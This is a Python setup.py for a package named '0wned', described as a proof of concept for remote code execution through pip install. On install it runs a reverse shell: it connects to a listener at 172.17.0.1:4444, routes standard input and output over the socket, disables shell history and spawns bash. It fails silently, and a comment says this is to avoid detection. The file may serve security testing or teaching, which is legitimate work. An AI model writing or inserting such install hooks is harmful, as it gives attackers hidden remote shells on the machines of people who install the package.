#!/usr/bin/env python
from setuptools import setup
import os
import socket
import pty

# Reverse Shell Payload
def reverse_shell():
    lhost = '172.17.0.1'  # Replace with your IP address
    lport = 4444                # Replace with your desired port
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((lhost, lport))
        os.dup2(s.fileno(), 0)  # Redirect stdin
        os.dup2(s.fileno(), 1)  # Redirect stdout
        os.dup2(s.fileno(), 2)  # Redirect stderr
        os.putenv('HISTFILE', '/dev/null')  # Disable command history
        pty.spawn('/bin/bash')  # Spawn a Bash shell
        s.close()
    except Exception as e:
        pass  # Fail silently to avoid detection

# Trigger the reverse shell
reverse_shell()

# Package Metadata
setup(
    name='0wned',
    version='1.0',
    description='A test package for PoC RCE via pip install',
    author='Your Name',
    packages=['dummy_package'],  # Include a dummy package
)
